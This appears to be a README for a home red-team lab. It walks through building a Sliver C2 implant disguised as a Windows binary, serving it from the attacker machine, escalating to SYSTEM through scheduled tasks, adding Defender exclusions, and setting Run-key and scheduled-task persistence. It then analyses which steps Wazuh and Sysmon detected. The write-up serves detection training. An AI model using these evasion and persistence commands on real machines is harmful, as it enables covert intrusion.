# 🔴 Red Team Home Lab — C2 Infrastructure, Persistence & Detection with Wazuh

> **Disclaimer:** This lab was built entirely in an isolated virtualized environment for **educational and research purposes only**. All techniques documented here are intended to help understand attacker methodologies and improve defensive capabilities. Do not replicate outside of controlled environments.

---

##  Overview

This project documents a full **attack simulation lab** built from scratch, covering:

- Infrastructure setup (VMs, networking)
- C2 deployment with **Sliver**
- Payload delivery and evasion
- Persistence techniques (Registry Run Keys + Scheduled Tasks)
- Detection engineering with **Wazuh SIEM + Sysmon**

The goal was to understand how a real attacker operates post-compromise and how a SIEM/EDR stack detects (or fails to detect) those actions.

---

##  Lab Architecture

```
┌─────────────────────────────────────────────────────┐
│                 Host Machine (Hypervisor)            │
│                                                     │
│  ┌──────────────┐  ┌──────────────┐  ┌───────────┐ │
│  │  Kali Linux  │  │  Windows 11  │  │  Ubuntu   │ │
│  │  (Attacker)  │  │  (Victim)    │  │  Server   │ │
│  │              │  │              │  │  (SIEM)   │ │
│  │  • Sliver C2 │  │  • Wazuh Agt │  │  • Wazuh  │ │
│  │  • HTTP C2   │  │  • Sysmon    │  │    Mgr    │ │
│  │    Server    │  │  • Win Def.  │  │  • ELK    │ │
│  └──────┬───────┘  └──────┬───────┘  └─────┬─────┘ │
│         │                 │                │        │
│         └─────────────────┴────────────────┘        │
│                    Bridge Network                   │
└─────────────────────────────────────────────────────┘
```

| VM | OS | Role | Key Tools |
|---|---|---|---|
| Attacker | Kali Linux | Red Team / C2 Operator | Sliver, Python HTTP server |
| Victim | Windows 11 | Target | Wazuh Agent, Sysmon |
| SIEM | Ubuntu Server | Blue Team / Monitoring | Wazuh Manager |

**Network type:** Bridge (all VMs on the same subnet, direct communication)

---

##  Setup & Configuration

### 1. Wazuh Manager (Ubuntu Server)

Installed via the official Wazuh installation script (single-node deployment).

```bash
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
sudo bash wazuh-install.sh -a
```

Access the Wazuh dashboard at `https://<ubuntu-server-ip>` after installation.

### 2. Wazuh Agent + Sysmon (Windows 11)

- Deployed **Wazuh Agent** from the Wazuh dashboard (Deploy Agent wizard)
- Installed **Sysmon** with a community ruleset (e.g., SwiftOnSecurity config)

```powershell
# Install Sysmon
.\Sysmon64.exe -accepteula -i sysmonconfig.xml
```

Sysmon generates detailed Windows event logs (process creation, network connections, registry changes) that Wazuh ingests and correlates.

### 3. Custom Wazuh Detection Rules

Added 3 custom rules in `/var/ossec/etc/rules/local_rules.xml` to detect:
- SQL Injection patterns in web logs
- Suspicious PowerShell execution
- Registry modification in Run keys

See [`rules/local_rules.xml`](rules/local_rules.xml) for the full ruleset.

---

##  Attack Chain

### Phase 1 — Payload Generation (Sliver C2)

On Kali Linux, Sliver was used to generate an HTTP-based implant with a non-suspicious name:

```bash
sliver > generate --http <kali-ip> --os windows --arch amd64 --save /tmp/diagtrackhost.exe
```

The implant was named `diagtrackhost.exe` — mimicking a legitimate Windows diagnostic service binary to blend in.

### Phase 2 — Payload Delivery

Hosted the payload via a Python HTTP server on Kali:

```bash
cd /tmp && python3 -m http.server 8080
```

On the victim Windows 11 machine, the file was downloaded via browser from `http://<kali-ip>:8080/diagtrackhost.exe`.

**Windows Defender** detected and blocked the executable. It had to be temporarily disabled to proceed — simulating a scenario where an attacker has prior access or the victim is tricked into disabling AV.

### Phase 3 — Initial Access & C2 Session

```bash
sliver > http  # Start HTTP listener

# On Windows (victim) — run the payload
.\diagtrackhost.exe
```

A Sliver session opened on the attacker machine. Commands like `shell`, registry modifications, and process injection were attempted — **all detected by Wazuh/Sysmon**.


### Phase 3b — Privilege Escalation to SYSTEM (Scheduled Task Abuse)

With an admin session open, `getsystem` in Sliver failed to produce a SYSTEM
shell. Instead, a scheduled task was used to spawn a process under
`NT AUTHORITY\SYSTEM`:

\```cmd
# Create a one-time task running as SYSTEM
schtasks /create /tn "WindowsTelemetryUpdate" /tr "C:\Windows\Temp\DiagTrackHost.exe" /sc once /st 00:00 /ru "NT AUTHORITY\SYSTEM" /f

# Force immediate execution
schtasks /run /tn "WindowsTelemetryUpdate" /f

# Clean up the task (payload stays in memory)
schtasks /delete /tn "WindowsTelemetryUpdate" /f
\```

**Why it works:** Windows treats scheduled task creation by an admin as routine
activity. Running a task as `NT AUTHORITY\SYSTEM` causes Windows to spawn the
process with a SYSTEM token, effectively escalating privileges without any
exploit.

**MITRE ATT&CK:** T1053.005 — Scheduled Task/Job

### Phase 4 — Evasion & Relocation

With Wazuh Manager temporarily stopped (simulating a detection gap), the implant was relocated to a less-monitored directory and added to Windows Defender exclusions:

```
# Add folder exclusion via Sliver shell
execute powerhsell.exe -Command "Add-MpPreference -ExclusionPath 'C:\Windows\Tracing'"

# Move and rename the implant
mv C:\Users\GuestWindows\Downloads\diagtrackhost.exe → C:\Windows\Tracing\DiagTrackHost.exe
```

`C:\Windows\Tracing` is a real Windows folder used by diagnostic tracing, making it a low-suspicion location for hiding a malicious binary.

### Phase 5 — Persistence

Two independent persistence mechanisms were established to survive reboots and user logoffs.

#### 5a. Registry Run Key

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v AggiornamentoC2 /t REG_SZ /d "C:\Windows\Tracing\DiagTrackHost.exe" /f
```

**How it works:** At logon, `userinit.exe` reads all values under the `Run` key and executes them. The implant launches silently in the background every time the user logs in.

#### 5b. Scheduled Task (Admin Privileges)

```cmd
schtasks /create /tn "DiagnosticaSistemaTask" /tr "C:\Windows\Tracing\DiagTrackHost.exe" /sc onlogon /ru GuestWindows /rl HIGHEST /f
```

**How it works:** A scheduled task runs the implant at logon with the highest available privilege level (`HIGHEST`), providing a redundant persistence channel independent of the registry.

---

##  Detection Analysis

### What Wazuh Caught

| Technique | MITRE ATT&CK | Detected? |
|---|---|---|
| Shell command execution via implant | T1059 | ✅ Yes |
| Registry Run Key modification | T1547.001 | ✅ Yes |
| Sysmon process creation (implant) | T1204 | ✅ Yes |
| Scheduled task creation | T1053.005 | ✅ Yes |
| Defender exclusion modification | T1562.001 | ✅ Yes |

### What Allowed Evasion

| Gap | Reason |
|---|---|
| Wazuh Manager stopped = no alerts | SIEM availability is itself a critical control |
| Defender disabled by user | Social engineering / admin rights required |
| `C:\Windows\Tracing` as implant location | Low-entropy path, real system folder |
| Mimicking legitimate binary name | `DiagTrackHost.exe` exists in real Windows installs |

### Sysmon Event IDs Triggered

- **Event ID 1** — Process Create (implant execution)
- **Event ID 11** — File Create (implant copied to Tracing)
- **Event ID 12/13** — Registry object created/value set (Run Key)
- **Event ID 3** — Network connection (C2 HTTP callback)

---

##  Key Takeaways

1. **Sysmon + Wazuh is a strong combo** — nearly every post-exploitation action was flagged when the stack was active.
2. **SIEM availability is a control** — stopping the Wazuh Manager created a blind spot. In production, this maps to monitoring the monitoring itself.
3. **Living-off-the-land paths work** — hiding payloads in real Windows directories with real-looking names reduces noise.
4. **Dual persistence is resilient** — using both Run Keys and Scheduled Tasks means removing one doesn't fully evict the attacker.
5. **Privilege escalation is hard without a real exploit** — `getsystem` in Sliver without a proper local privilege escalation vulnerability didn't produce a SYSTEM session, reinforcing that tool claims ≠ guaranteed results.

---

##  Repository Structure

```
lab-c2-detection/
├── README.md               ← This file
├── docs/
│   ├── architecture.md     ← Detailed network and VM setup
│   ├── sysmon-setup.md     ← Sysmon installation and config notes
│   └── wazuh-setup.md      ← Wazuh Manager/Agent setup notes
├── configs/
│   └── sysmon-config.xml   ← Sysmon configuration used
└── rules/
    └── local_rules.xml     ← Custom Wazuh detection rules
```

---

##  References

- [Wazuh Documentation](https://documentation.wazuh.com/)
- [Sliver C2 Framework](https://github.com/BishopFox/sliver)
- [Sysmon — SwiftOnSecurity Config](https://github.com/SwiftOnSecurity/sysmon-config)
- [MITRE ATT&CK — Persistence](https://attack.mitre.org/tactics/TA0003/)
- [MITRE ATT&CK — Defense Evasion](https://attack.mitre.org/tactics/TA0005/)

---

## ⚠️ Legal Notice

This project was conducted in a **fully isolated lab environment**. No real systems, networks, or users were targeted. All techniques are documented for **educational purposes** to support blue team training, detection engineering, and cybersecurity research.
